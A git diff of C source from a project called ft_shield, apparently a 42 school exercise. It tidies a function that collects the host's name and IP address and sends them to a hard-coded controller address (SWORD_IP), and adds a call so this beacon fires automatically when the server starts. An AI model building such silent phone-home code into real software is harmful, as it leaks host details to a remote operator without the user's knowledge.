@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/24 13:13:19 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/24 13:42:27 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -60,21 +60,26 @@ int	unlock_file(t_ctx *ctx)
 
 void	send_host_to_sword()
 {
-	char hostbuffer[256];
-	char *IPbuffer;
+	char host_buffer[256];
+	char *ip_buffer;
 	struct hostent *host_entry;
 	int hostname;
 
-	hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+	hostname = gethostname(host_buffer, sizeof(host_buffer));
+	if (hostname == -1)
+		return ;
 
-	host_entry = gethostbyname(hostbuffer);
+	host_entry = gethostbyname(host_buffer);
+	if (!host_entry)
+		return ;
 
-	IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
+	ip_buffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
+	if (!ip_buffer)
+		return ;
 
 	char	buf[4096];
-	sprintf(buf, "Running ft_shield on %s %s\n", hostbuffer, IPbuffer);
+	sprintf(buf, "Running ft_shield on %s %s\n", host_buffer, ip_buffer);
 
-	
 	struct sockaddr_in	server_addr;
 	int					socket_fd;
 
@@ -86,8 +91,13 @@ void	send_host_to_sword()
 	inet_pton(AF_INET, SWORD_IP, &server_addr.sin_addr);
 
 	if (connect(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
+	{
+		close(socket_fd);
 		return ;
+	}
+
 	send(socket_fd, buf, strlen(buf), 0);
+	close(socket_fd);
 }
 
 int	ctx_init(t_ctx *ctx)
@@ -132,6 +142,7 @@ int	ctx_init(t_ctx *ctx)
 	server_set_connect_hook(&ctx->server, connect_hook, ctx);
 	server_set_disconnect_hook(&ctx->server, disconnect_hook, ctx);
 	logger_log(ctx, LOG_INFO, "Server opened");
+	send_host_to_sword();
 	return (1);
 }
 
